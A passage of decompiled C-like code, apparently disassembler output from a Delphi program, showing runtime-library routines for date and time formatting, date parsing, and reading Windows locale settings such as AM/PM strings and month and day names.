                v24 = 1;
              }
            }
            else
            {
              if ( v34 >= 0xCu )
                v11 += 2;
              sub_417B64(v11, 1, System::TDateTime);
              v30 += 2;
              v24 = 1;
            }
          }
          else
          {
            if ( v34 >= 0xCu )
              v11 += 3;
            sub_417B64(v11, 2, System::TDateTime);
            v30 += 4;
            v24 = 1;
          }
          goto LABEL_112;
        case 'C':
          sub_417CB8((int)&savedregs);
          sub_417FFC(System::TDateTime);
          sub_417D24((int)&savedregs);
          if ( v34 || v33 || v32 || v31 )
          {
            sub_417B64(&dword_4188CC, 1, System::TDateTime);
            sub_417FFC(System::TDateTime);
          }
          goto LABEL_112;
        case 'D':
          sub_417CB8((int)&savedregs);
          if ( (unsigned int)(v28 - 1) < 2 )
          {
            sub_417CEC((int)&savedregs);
            sub_417C6C(v35, v28, System::TDateTime);
          }
          else
          {
            if ( v28 != 3 && v28 != 4 )
              goto LABEL_29;
            Sysutils::DayOfWeek(System::TDateTime);
            unknown_libname_80(System::TDateTime);
          }
          goto LABEL_112;
        case 'E':
          sub_417CB8((int)&savedregs);
          sub_417CEC((int)&savedregs);
          sub_417EE0(v28, &v18, (int)&savedregs);
          unknown_libname_80(System::TDateTime);
          goto LABEL_112;
        case 'G':
          sub_417CB8((int)&savedregs);
          sub_417CEC((int)&savedregs);
          sub_417D64(&v19, v28, (int)&savedregs);
          unknown_libname_80(System::TDateTime);
          goto LABEL_112;
        case 'H':
          sub_417CB8((int)&savedregs);
          sub_417D24((int)&savedregs);
          v23 = 0;
          v5 = v30;
          break;
        case 'M':
          sub_417CB8((int)&savedregs);
          sub_417CEC((int)&savedregs);
          if ( (unsigned int)(v28 - 1) < 2 )
            sub_417C6C(v36, v28, System::TDateTime);
          else
            unknown_libname_80(System::TDateTime);
          goto LABEL_112;
        case 'N':
          sub_417CB8((int)&savedregs);
          sub_417D24((int)&savedregs);
          if ( v28 > 2 )
            v28 = 2;
          sub_417C6C(v33, v28, System::TDateTime);
          goto LABEL_112;
        case 'S':
          sub_417CB8((int)&savedregs);
          sub_417D24((int)&savedregs);
          if ( v28 > 2 )
            v28 = 2;
          sub_417C6C(v32, v28, System::TDateTime);
          goto LABEL_112;
        case 'T':
          sub_417CB8((int)&savedregs);
LABEL_29:
          sub_417FFC(System::TDateTime);
          goto LABEL_112;
        case 'Y':
          sub_417CB8((int)&savedregs);
          sub_417CEC((int)&savedregs);
          if ( v28 > 2 )
            sub_417C6C(v37, 4, System::TDateTime);
          else
            sub_417C6C(v37 % 0x64u, 2, System::TDateTime);
          goto LABEL_112;
        case 'Z':
          sub_417CB8((int)&savedregs);
          sub_417D24((int)&savedregs);
          if ( v28 > 3 )
            v28 = 3;
          sub_417C6C(v31, v28, System::TDateTime);
          goto LABEL_112;
        default:
LABEL_111:
          sub_417B64(&v29, 1, System::TDateTime);
          goto LABEL_112;
      }
      while ( *v5 )
      {
        v21 = *v5;
        if ( v21 >= 0xD800u && v21 <= 0xDFFFu )
        {
          v5 = sub_41B768(v5);
        }
        else
        {
          v7 = *v5;
          if ( v7 > 0x48 )
          {
            v10 = v7 - 97;
            if ( v10 )
            {
              if ( v10 == 7 )
                break;
              goto LABEL_55;
            }
LABEL_49:
            if ( !v23 )
            {
              if ( !sub_415978(v5, L"AM/PM", 5u) || !sub_415978(v5, L"A/P", 3u) || !sub_415978(v5, L"AMPM", 4u) )
                v24 = 1;
              break;
            }
            goto LABEL_55;
          }
          if ( v7 == 72 )
            break;
          v8 = v7 - 34;
          if ( !v8 || (v9 = v8 - 5) == 0 )
          {
            v23 ^= 1u;
            goto LABEL_55;
          }
          if ( v9 == 26 )
            goto LABEL_49;
LABEL_55:
          ++v5;
        }
      }
      v22 = v34;
      if ( v24 )
      {
        if ( v22 )
        {
          if ( v22 > 0xCu )
            v22 -= 12;
        }
        else
        {
          v22 = 12;
        }
      }
      if ( v28 > 2 )
        v28 = 2;
      sub_417C6C(v22, v28, System::TDateTime);
    }
  }
LABEL_114:
  __writefsdword(0, v16[0]);
  v17 = (int *)&loc_41888E;
  return sub_406CA4((int)&v18, 2);
}
// 417C50: using guessed type _DWORD __cdecl unknown_libname_80(_DWORD);
// 418898: using guessed type wchar_t aAmPm[6];
// 4188A4: using guessed type wchar_t aAP[4];
// 4188AC: using guessed type wchar_t aAmpm[5];
// 4188B8: using guessed type char (*off_4188B8[2])[3];
// 4188C4: using guessed type char (*off_4188C4)[3];
// 4188CC: using guessed type int dword_4188CC;

//----- (004188D0) --------------------------------------------------------
_DWORD *__fastcall sub_4188D0(volatile __int32 *a1, unsigned __int16 *a2, void *a3, int a4, int a5)
{
  void *v6; // eax
  char *v7; // ebx
  void *v8; // eax
  void *v9; // eax
  void *v10; // ebx
  unsigned int v12[2]; // [esp-Ch] [ebp-230h] BYREF
  int *v13; // [esp-4h] [ebp-228h]
  int v14; // [esp+8h] [ebp-21Ch] BYREF
  int v15; // [esp+Ch] [ebp-218h] BYREF
  void *v16[3]; // [esp+10h] [ebp-214h] BYREF
  int v17; // [esp+1Ch] [ebp-208h]
  char v18[512]; // [esp+20h] [ebp-204h] BYREF
  void *v19; // [esp+220h] [ebp-4h] BYREF
  int savedregs; // [esp+224h] [ebp+0h] BYREF

  v14 = 0;
  v15 = 0;
  v19 = 0;
  v16[0] = 0;
  v16[1] = a3;
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_418A61;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  v17 = 0;
  v16[2] = 0;
  if ( a2 )
    sub_417FFC(a2, (int)&savedregs);
  else
    sub_417FFC((unsigned __int16 *)&dword_418A70, (int)&savedregs);
  v6 = v19;
  if ( v19 )
    v6 = (void *)*((_DWORD *)v19 - 1);
  if ( (int)v6 <= 0 )
  {
    sub_41C4DC((int)v18, 255, 0, v17, &v14);
    sub_406FE8(a1, v14);
  }
  else
  {
    v7 = (char *)v19;
    if ( v19 )
      v7 = (char *)*((_DWORD *)v19 - 1);
    System::__linkproc__ DynArraySetLength(&v7[v17]);
    v8 = v19;
    if ( v19 )
      v8 = (void *)*((_DWORD *)v19 - 1);
    System::Move(v19, v16[0], 2 * (_DWORD)v8);
    if ( v17 > 0 )
    {
      v9 = v19;
      if ( v19 )
        v9 = (void *)*((_DWORD *)v19 - 1);
      System::Move(v18, (char *)v16[0] + 2 * (_DWORD)v9, 2 * v17);
    }
    v10 = v16[0];
    if ( v16[0] )
      v10 = (void *)*((_DWORD *)v16[0] - 1);
    sub_41C518(v16[0], (int)v10 - 1, &v15);
    sub_406FE8(a1, v15);
  }
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_418A68;
  sub_406CA4((int)&v14, 2);
  sub_408B34(v16, (int)dword_402B7C);
  return sub_408B34(&v19, (int)&byte_417B38);
}
// 402B7C: using guessed type int dword_402B7C[7];
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 417B38: using guessed type char byte_417B38;
// 418A70: using guessed type int dword_418A70;

//----- (00418A8C) --------------------------------------------------------
int __fastcall sub_418A8C(int a1, int *a2)
{
  int i; // ebx
  int result; // eax

  for ( i = *a2; ; ++i )
  {
    result = System::__linkproc__ LStrLen(a1);
    if ( i > result || *(_WORD *)(a1 + 2 * i - 2) != 32 )
      break;
  }
  *a2 = i;
  return result;
}
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);

//----- (00418AB4) --------------------------------------------------------
int __fastcall sub_418AB4(int a1, int *a2, _WORD *a3, _BYTE *a4)
{
  int v5; // ebx
  int v6; // esi
  int v7; // eax
  unsigned __int8 v9; // [esp+Fh] [ebp-9h]

  v9 = 0;
  *a4 = 0;
  sub_418A8C(a1, a2);
  v5 = *a2;
  v6 = 0;
  while ( v5 <= System::__linkproc__ LStrLen(a1)
       && (unsigned __int16)(*(_WORD *)(a1 + 2 * v5 - 2) - 48) < 0xAu
       && (unsigned __int16)v6 < 0x3E8u )
  {
    v7 = 10 * v6;
    LOWORD(v7) = *(_WORD *)(a1 + 2 * v5 - 2) - 48 + 10 * v6;
    v6 = v7;
    ++v5;
  }
  if ( v5 > *a2 )
  {
    *a4 = v5 - *a2;
    *a2 = v5;
    *a3 = v6;
    return 1;
  }
  return v9;
}
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);

//----- (00418B4C) --------------------------------------------------------
int __fastcall sub_418B4C(int a1, int *a2, int a3)
{
  int v4; // ebx
  int v5; // eax
  unsigned int v7[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v8; // [esp-4h] [ebp-18h]
  int cchCount2; // [esp+8h] [ebp-Ch] BYREF
  int cchCount1; // [esp+Ch] [ebp-8h] BYREF
  int v11; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  cchCount2 = 0;
  cchCount1 = a3;
  v11 = a1;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_418BCB;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v4 = 0;
  if ( a3 )
  {
    sub_418A8C(v11, a2);
    v5 = sub_41C314(&cchCount1);
    sub_41C5E4(&v11, *a2 - 1, v5, &cchCount2);
    if ( !Sysutils::AnsiCompareText(cchCount1, cchCount2) )
    {
      *a2 += sub_41C314(&cchCount1);
      LOBYTE(v4) = 1;
    }
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_418BD2;
  sub_406C44(&cchCount2);
  return v4;
}

//----- (00418BDC) --------------------------------------------------------
int __fastcall sub_418BDC(int a1, int *a2, __int16 a3)
{
  int v6; // ebx
  int v7; // eax

  v6 = 0;
  sub_418A8C(a1, a2);
  v7 = a1;
  if ( a1 )
    v7 = *(_DWORD *)(a1 - 4);
  if ( v7 >= *a2 && a3 == *(_WORD *)(a1 + 2 * *a2 - 2) )
  {
    ++*a2;
    LOBYTE(v6) = 1;
  }
  return v6;
}

//----- (00418C14) --------------------------------------------------------
int __fastcall sub_418C14(int a1)
{
  int v2; // ebx
  int i; // edi

  v2 = 0;
  for ( i = 1; i <= System::__linkproc__ LStrLen(a1); ++i )
  {
    switch ( *(_WORD *)(a1 + 2 * i - 2) & 0xDF )
    {
      case 'D':
        LOBYTE(v2) = 1;
        return v2;
      case 'E':
        LOBYTE(v2) = 2;
        return v2;
      case 'M':
        return 0;
      case 'Y':
        LOBYTE(v2) = 2;
        return v2;
    }
  }
  return v2;
}
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);

//----- (00418C68) --------------------------------------------------------
__int16 __fastcall sub_418C68(int a1, int *a2)
{
  unsigned __int16 v4; // di
  int v6; // eax

  while ( 1 )
  {
    v6 = System::__linkproc__ LStrLen(a1);
    if ( v6 < *a2 )
      break;
    LOWORD(v6) = *(_WORD *)(a1 + 2 * *a2 - 2) - 58;
    if ( (unsigned __int16)(*(_WORD *)(a1 + 2 * *a2 - 2) - 48) < 0xAu )
      break;
    v4 = *(_WORD *)(a1 + 2 * *a2 - 2);
    if ( v4 >= 0xD800u && v4 <= 0xDFFFu )
      *a2 = sub_41B7DC(a1, *a2);
    else
      ++*a2;
  }
  return v6;
}
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);

//----- (00418D1C) --------------------------------------------------------
int __fastcall sub_418D1C(int a1, int *a2, int a3, int a4)
{
  int v5; // eax
  int v6; // eax
  char v7; // al
  int v8; // eax
  int v9; // eax
  unsigned int v11[2]; // [esp-Ch] [ebp-4Ch] BYREF
  int *v12; // [esp-4h] [ebp-44h]
  int v13; // [esp+Ch] [ebp-34h] BYREF
  int cchCount2; // [esp+10h] [ebp-30h] BYREF
  int v15; // [esp+14h] [ebp-2Ch]
  int v16; // [esp+18h] [ebp-28h]
  char v17; // [esp+1Dh] [ebp-23h] BYREF
  char v18; // [esp+1Eh] [ebp-22h] BYREF
  char v19; // [esp+1Fh] [ebp-21h] BYREF
  int v20; // [esp+20h] [ebp-20h]
  char v21[6]; // [esp+24h] [ebp-1Ch] BYREF
  char v22; // [esp+2Ah] [ebp-16h]
  unsigned __int8 v23; // [esp+2Bh] [ebp-15h]
  int v24; // [esp+2Ch] [ebp-14h]
  int v25; // [esp+30h] [ebp-10h] BYREF
  int v26; // [esp+34h] [ebp-Ch] BYREF
  __int32 v27; // [esp+38h] [ebp-8h] BYREF
  int v28; // [esp+3Ch] [ebp-4h]
  int savedregs; // [esp+40h] [ebp+0h] BYREF

  v13 = 0;
  cchCount2 = 0;
  v27 = 0;
  v26 = 0;
  v24 = a3;
  v25 = a1;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_419059;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v23 = 0;
  v22 = sub_418C14(*(_DWORD *)(a4 + 12));
  v28 = 0;
  if ( **(_WORD **)(a4 + 12) == 103 )
  {
    sub_418C68(v25, a2);
    sub_41C5E4(&v25, 0, *a2 - 1, &v26);
    sub_41C608(&v26, &v27);
    v28 = sub_41A370(a4, v27);
  }
  else if ( sub_41B828((int)dword_41907C, *(_DWORD *)(a4 + 12)) > 0 )
  {
    v16 = *(_DWORD *)(a4 + 188);
    v5 = v16;
    if ( v16 )
      v5 = *(_DWORD *)(v16 - 4);
    if ( v5 - 1 >= 0 )
    {
      v15 = *(_DWORD *)(a4 + 188);
      v6 = v15;
      if ( v15 )
        v6 = *(_DWORD *)(v15 - 4);
      v28 = *(_DWORD *)(*(_DWORD *)(a4 + 188) + 24 * (v6 - 1) + 4);
    }
  }
  if ( (unsigned __int8)sub_418AB4(v25, a2, &v21[4], &v19)
    && (unsigned __int8)sub_418BDC(v25, a2, *(_WORD *)(a4 + 6))
    && (unsigned __int8)sub_418AB4(v25, a2, &v21[2], &v18) )
  {
    if ( (unsigned __int8)sub_418BDC(v25, a2, *(_WORD *)(a4 + 6)) )
    {
      if ( !(unsigned __int8)sub_418AB4(v25, a2, v21, &v17) )
        goto LABEL_38;
      if ( v22 )
      {
        if ( v22 == 1 )
        {
          v7 = v17;
          HIWORD(v20) = *(_WORD *)&v21[2];
          LOWORD(v20) = *(_WORD *)&v21[4];
        }
        else
        {
          v7 = v19;
          v20 = *(_DWORD *)v21;
        }
      }
      else
      {
        v7 = v17;
        v20 = *(_DWORD *)&v21[2];
      }
      if ( v28 <= 0 )
      {
        if ( (unsigned __int8)v7 <= 2u )
          Sysutils::CurrentYear();
      }
      else
      {
        unknown_libname_81(&savedregs);
      }
    }
    else
    {
      Sysutils::CurrentYear();
      if ( v22 == 1 )
      {
        LOWORD(v20) = *(_WORD *)&v21[4];
        HIWORD(v20) = *(_WORD *)&v21[2];
      }
      else
      {
        v20 = *(_DWORD *)&v21[2];
      }
    }
    sub_418BDC(v25, a2, *(_WORD *)(a4 + 6));
    sub_418A8C(v25, a2);
    if ( byte_46C694 && sub_41C4C0((int *)(a4 + 12), (int)L"dddd") )
    {
      if ( (unsigned __int16)(**(_WORD **)(a4 + 28) - 48) >= 0xAu )
      {
        do
        {
          while ( System::__linkproc__ LStrLen(v25) >= *a2 && *(_WORD *)(v25 + 2 * *a2 - 2) != 32 )
            ++*a2;
          sub_418A8C(v25, a2);
          if ( System::__linkproc__ LStrLen(v25) < *a2 )
            break;
          v8 = sub_41C314((int *)(a4 + 20));
          sub_41C5E4(&v25, *a2 - 1, v8, &cchCount2);
          if ( !Sysutils::AnsiCompareText(*(_DWORD *)(a4 + 20), cchCount2) )
            break;
          v9 = sub_41C314((int *)(a4 + 24));
          sub_41C5E4(&v25, *a2 - 1, v9, &v13);
        }
        while ( Sysutils::AnsiCompareText(*(_DWORD *)(a4 + 24), v13) );
      }
      else
      {
        sub_418C68(v25, a2);
      }
    }
    v23 = Sysutils::TryEncodeDate(v24);
  }
LABEL_38:
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_419060;
  sub_406CA4((int)&v13, 2);
  sub_406CA4((int)&v26, 2);
  return v23;
}
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 417774: using guessed type _DWORD __stdcall Sysutils::TryEncodeDate(_DWORD);
// 418CC0: using guessed type _DWORD __cdecl unknown_libname_81(_DWORD);
// 41907C: using guessed type int dword_41907C[4];
// 41908C: using guessed type wchar_t aDddd[5];
// 46C694: using guessed type char byte_46C694;

//----- (004192D8) --------------------------------------------------------
int __usercall sub_4192D8@<eax>(int a1@<eax>, double *a2@<edx>, int a3@<ecx>, int a4@<ebx>)
{
  int v6; // eax
  bool v7; // bl
  int v8; // eax
  int v9; // ebp
  long double v10; // fst7
  int v13; // [esp+4h] [ebp-34h] BYREF
  int v14; // [esp+8h] [ebp-30h] BYREF
  int v15; // [esp+Ch] [ebp-2Ch] BYREF
  int v16; // [esp+10h] [ebp-28h]
  double v17; // [esp+18h] [ebp-20h] BYREF
  double v18; // [esp+20h] [ebp-18h]

  LOBYTE(a4) = 1;
  v13 = 1;
  v18 = 0.0;
  if ( **(_WORD **)(a3 + 12) != 103 )
    sub_418C68(a1, &v13);
  if ( !(unsigned __int8)sub_418D1C(a1, &v13, (int)&v17, a3) )
    return unknown_libname_83();
  v14 = v13;
  sub_418C68(a1, &v14);
  v6 = a1;
  if ( a1 )
    v6 = *(_DWORD *)(a1 - 4);
  if ( v6 <= v14 )
  {
    *a2 = v17;
  }
  else
  {
    v15 = v13 - 1;
    v7 = 0;
    while ( !v7 && v15 < v14 )
    {
      if ( v15 <= 0 || v15 >= v14 )
      {
        v7 = 1;
      }
      else
      {
        v16 = ++v15;
        v7 = (unsigned __int8)sub_418B4C(a1, &v15, *(_DWORD *)(a3 + 20))
          || (unsigned __int8)sub_418B4C(a1, &v15, (int)L"AM")
          || (unsigned __int8)sub_418B4C(a1, &v15, *(_DWORD *)(a3 + 24))
          || (unsigned __int8)sub_418B4C(a1, &v15, (int)L"PM");
        v15 = v16;
      }
      if ( !v7 )
      {
        while ( *(_WORD *)(a1 + 2 * v15 - 2) != 32 )
        {
          v8 = System::__linkproc__ LStrLen(a1);
          if ( v8 < v15 )
            break;
          ++v15;
        }
        v9 = a1;
        if ( a1 )
          v9 = *(_DWORD *)(a1 - 4);
        if ( v9 < v15 )
          v15 = 0;
      }
    }
    if ( v7 )
    {
      if ( v15 <= 0 )
      {
        v13 = v14;
      }
      else if ( v15 >= v14 )
      {
        v13 = v14;
      }
      else
      {
        v13 = v15;
      }
    }
    else
    {
      v13 = v14;
    }
    a4 = unknown_libname_82(a3);
    if ( (_BYTE)a4 )
    {
      if ( v17 < 0.0 )
        v10 = v17 - v18;
      else
        v10 = v17 + v18;
      *a2 = v10;
    }
  }
  return a4;
}
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 419098: using guessed type _DWORD __stdcall unknown_libname_82(_DWORD);
// 419298: using guessed type int unknown_libname_83(void);
// 4194DC: using guessed type wchar_t aAm_1[3];
// 4194F0: using guessed type wchar_t aPm_1[3];

//----- (004194F8) --------------------------------------------------------
HLOCAL __fastcall sub_4194F8(DWORD dwMessageId, LPCVOID lpSource, _DWORD *a3)
{
  DWORD v4; // ecx
  int v5; // eax
  unsigned __int16 v6; // dx
  unsigned int v8[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v9; // [esp-4h] [ebp-10h]
  WCHAR Buffer[2]; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v4 = 13056;
  if ( lpSource )
    v4 = 15104;
  v5 = FormatMessageW(v4, lpSource, dwMessageId, 0, Buffer, 0, 0);
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_41956E;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  while ( v5 > 0 )
  {
    v6 = *(_WORD *)(*(_DWORD *)Buffer + 2 * v5 - 2);
    if ( v6 > 0x20u && v6 != 46 )
      break;
    --v5;
  }
  sub_406D90(a3, *(void **)Buffer, v5);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_419575;
  return LocalFree_0(*(HLOCAL *)Buffer);
}

//----- (0041957C) --------------------------------------------------------
volatile __int32 *__fastcall sub_41957C(LCID Locale, LCTYPE LCType, int a3, volatile __int32 *a4)
{
  int LocaleInfoW_0; // eax
  WCHAR LCData[256]; // [esp+8h] [ebp-200h] BYREF

  LocaleInfoW_0 = GetLocaleInfoW_0(Locale, LCType, LCData, 256);
  if ( LocaleInfoW_0 <= 0 )
    return sub_406FE8(a4, a3);
  else
    return sub_406D90(a4, LCData, LocaleInfoW_0 - 1);
}

//----- (004195C8) --------------------------------------------------------
int __fastcall sub_4195C8(LCID Locale, LCTYPE LCType, int a3)
{
  int LCData[4]; // [esp+0h] [ebp-10h] BYREF

  LCData[0] = a3;
  if ( GetLocaleInfoW_0(Locale, LCType, (LPWSTR)LCData, 2) <= 0 )
    return a3;
  else
    return LOWORD(LCData[0]);
}
// 4195C8: using guessed type int LCData[4];

//----- (004195F4) --------------------------------------------------------
int __usercall sub_4195F4@<eax>(LCID Locale@<eax>, int a2@<edx>, int a3@<edi>)
{
  LCID ThreadLocale; // esi
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // edi
  int v9; // ecx
  int v10; // ecx
  unsigned int v12; // [esp-2Ch] [ebp-70h]
  _DWORD v13[6]; // [esp-Ch] [ebp-50h] BYREF
  int v14; // [esp+Ch] [ebp-38h] BYREF
  int v15; // [esp+10h] [ebp-34h] BYREF
  int v16; // [esp+14h] [ebp-30h] BYREF
  int v17; // [esp+18h] [ebp-2Ch] BYREF
  int v18; // [esp+1Ch] [ebp-28h] BYREF
  int v19; // [esp+20h] [ebp-24h] BYREF
  int v20; // [esp+24h] [ebp-20h] BYREF
  int v21; // [esp+28h] [ebp-1Ch] BYREF
  int v22; // [esp+2Ch] [ebp-18h] BYREF
  int System__AnsiString; // [esp+30h] [ebp-14h] BYREF
  int v24; // [esp+34h] [ebp-10h] BYREF
  unsigned int v25; // [esp+38h] [ebp-Ch] BYREF
  __int32 v26; // [esp+3Ch] [ebp-8h] BYREF
  __int32 v27; // [esp+40h] [ebp-4h] BYREF
  int savedregs; // [esp+44h] [ebp+0h] BYREF

  ThreadLocale = Locale;
  v13[2] = &savedregs;
  v13[1] = &loc_4198D9;
  v13[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  if ( !IsValidLocale_0(Locale, 1u) )
    ThreadLocale = GetThreadLocale();
  sub_408B34((_DWORD *)(a2 + 188), (int)dword_413DBC);
  sub_419D28(ThreadLocale, a2);
  sub_4199E8(ThreadLocale, a2);
  sub_419AA4(ThreadLocale, a2, a2, a3, ThreadLocale);
  sub_41957C(ThreadLocale, 0x14u, 0, &v24);
  sub_406FE8((volatile __int32 *)a2, v24);
  sub_41957C(ThreadLocale, 0x1Bu, (int)dword_4198F4, &System__AnsiString);
  *(_BYTE *)(a2 + 4) = Sysutils::StrToIntDef(System__AnsiString, 0);
  sub_41957C(ThreadLocale, 0x1Cu, (int)dword_4198F4, &v22);
  *(_BYTE *)(a2 + 198) = Sysutils::StrToIntDef(v22, 0);
  LOWORD(v5) = 44;
  *(_WORD *)(a2 + 192) = sub_4195C8(ThreadLocale, 0xFu, v5);
  LOWORD(v6) = 46;
  *(_WORD *)(a2 + 194) = sub_4195C8(ThreadLocale, 0xEu, v6);
  sub_41957C(ThreadLocale, 0x19u, (int)dword_4198F4, &v21);
  *(_BYTE *)(a2 + 5) = Sysutils::StrToIntDef(v21, 0);
  LOWORD(v7) = 47;
  v8 = sub_4195C8(ThreadLocale, 0x1Du, v7);
  *(_WORD *)(a2 + 6) = v8;
  sub_41A084(ThreadLocale, 0x1Fu, (int)L"m/d/yy", a2, v8, ThreadLocale, &v20, v8);
  sub_406FE8((volatile __int32 *)(a2 + 12), v20);
  sub_41A084(ThreadLocale, 0x20u, (int)L"mmmm d, yyyy", a2, v8, ThreadLocale, &v19, *(unsigned __int16 *)(a2 + 6));
  sub_406FE8((volatile __int32 *)(a2 + 16), v19);
  LOWORD(v9) = 58;
  *(_WORD *)(a2 + 8) = sub_4195C8(ThreadLocale, 0x1Eu, v9);
  sub_41957C(ThreadLocale, 0x28u, (int)L"am", &v18);
  sub_406FE8((volatile __int32 *)(a2 + 20), v18);
  sub_41957C(ThreadLocale, 0x29u, (int)L"pm", &v17);
  sub_406FE8((volatile __int32 *)(a2 + 24), v17);
  sub_406C44(&v26);
  sub_406C44(&v25);
  sub_41957C(ThreadLocale, 0x25u, (int)dword_4198F4, &v16);
  if ( Sysutils::StrToIntDef(v16, 0) )
    sub_407030(&v27, (__int32)L"hh");
  else
    sub_407030(&v27, (__int32)dword_419970);
  sub_41957C(ThreadLocale, 0x23u, (int)dword_4198F4, &v15);
  if ( !Sysutils::StrToIntDef(v15, 0) )
  {
    sub_41957C(ThreadLocale, 0x1005u, (int)dword_4198F4, &v14);
    if ( Sysutils::StrToIntDef(v14, 0) )
      sub_407030(&v26, (__int32)L"AMPM ");
    else
      sub_407030((volatile __int32 *)&v25, (__int32)&off_419994);
  }
  sub_4079F0((int *)(a2 + 28), 4);
  v12 = v25;
  sub_4079F0((int *)(a2 + 32), 4);
  LOWORD(v10) = 44;
  *(_WORD *)(a2 + 10) = sub_4195C8(ThreadLocale, 0xCu, v10);
  *(_WORD *)(a2 + 196) = 50;
  __writefsdword(0, v12);
  return sub_406CA4((int)&v14, 14);
}
// 4196C5: variable 'v5' is possibly undefined
// 4196DC: variable 'v6' is possibly undefined
// 419715: variable 'v7' is possibly undefined
// 419771: variable 'v9' is possibly undefined
// 4198AC: variable 'v10' is possibly undefined
// 413DBC: using guessed type int dword_413DBC[6];
// 4198F4: using guessed type int dword_4198F4[4];
// 419904: using guessed type wchar_t aMDYy[7];
// 419920: using guessed type wchar_t aMmmmDYyyy[13];
// 419948: using guessed type wchar_t aAm_0[3];
// 41995C: using guessed type wchar_t aPm_0[3];
// 419970: using guessed type int dword_419970[4];
// 419980: using guessed type wchar_t aHh[3];
// 419994: using guessed type int (*off_419994)[8];
// 4199AC: using guessed type wchar_t aAmpm_0[6];

//----- (004199E8) --------------------------------------------------------
int __fastcall sub_4199E8(LCID a1, int a2)
{
  int v2; // esi
  volatile __int32 *v3; // ebx
  int v4; // edi
  unsigned int v6[2]; // [esp-Ch] [ebp-28h] BYREF
  int *v7; // [esp-4h] [ebp-20h]
  int v8; // [esp+Ch] [ebp-10h] BYREF
  int v9[2]; // [esp+10h] [ebp-Ch] BYREF
  LCID Locale; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v8 = 0;
  v9[0] = 0;
  v9[1] = a2;
  Locale = a1;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_419A93;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v2 = 1;
  v3 = (volatile __int32 *)(a2 + 132);
  do
  {
    v4 = (v2 + 5) % 7;
    sub_41A004(Locale, v4 + 49, v2 - 1, (int)off_4664B4, 6, v9);
    sub_406FE8(v3, v9[0]);
    sub_41A004(Locale, v4 + 42, v2 - 1, (int)off_4664D0, 6, &v8);
    sub_406FE8(v3 + 7, v8);
    ++v2;
    ++v3;
  }
  while ( v2 != 8 );
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_419A9A;
  return sub_406CA4((int)&v8, 2);
}
// 4664B4: using guessed type int **off_4664B4[14];
// 4664D0: using guessed type int **off_4664D0[7];

//----- (00419AA4) --------------------------------------------------------
int __usercall sub_419AA4@<eax>(LCID Locale@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  int v6; // esi
  volatile __int32 *v7; // ebx
  unsigned int v9[2]; // [esp-18h] [ebp-24h] BYREF
  int *v10; // [esp-10h] [ebp-1Ch]
  int v11; // [esp-Ch] [ebp-18h]
  int v12; // [esp-8h] [ebp-14h]
  int v13; // [esp-4h] [ebp-10h]
  int v14; // [esp+0h] [ebp-Ch] BYREF
  int v15[2]; // [esp+4h] [ebp-8h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v15[0] = 0;
  v14 = 0;
  v13 = a3;
  v12 = a5;
  v11 = a4;
  v15[1] = a2;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_419B39;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v6 = 1;
  v7 = (volatile __int32 *)(a2 + 36);
  do
  {
    sub_41A004(Locale, v6 + 67, v6 - 1, (int)off_466454, 11, v15);
    sub_406FE8(v7, v15[0]);
    sub_41A004(Locale, v6 + 55, v6 - 1, (int)off_466484, 11, &v14);
    sub_406FE8(v7 + 12, v14);
    ++v6;
    ++v7;
  }
  while ( v6 != 13 );
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_419B40;
  return sub_406CA4((int)&v14, 2);
}
// 419AA4: could not find valid save-restore pair for ebx
// 419AA4: could not find valid save-restore pair for edi
// 419AA4: could not find valid save-restore pair for esi
// 466454: using guessed type int **off_466454[38];
// 466484: using guessed type int **off_466484[26];

//----- (00419BEC) --------------------------------------------------------
BOOL __stdcall CalInfoEnumProc(LPWSTR a1)
{
  int v1; // esi
  int v2; // esi
  int v3; // esi
  unsigned int v5[7]; // [esp-Ch] [ebp-1Ch] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_419C7E;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
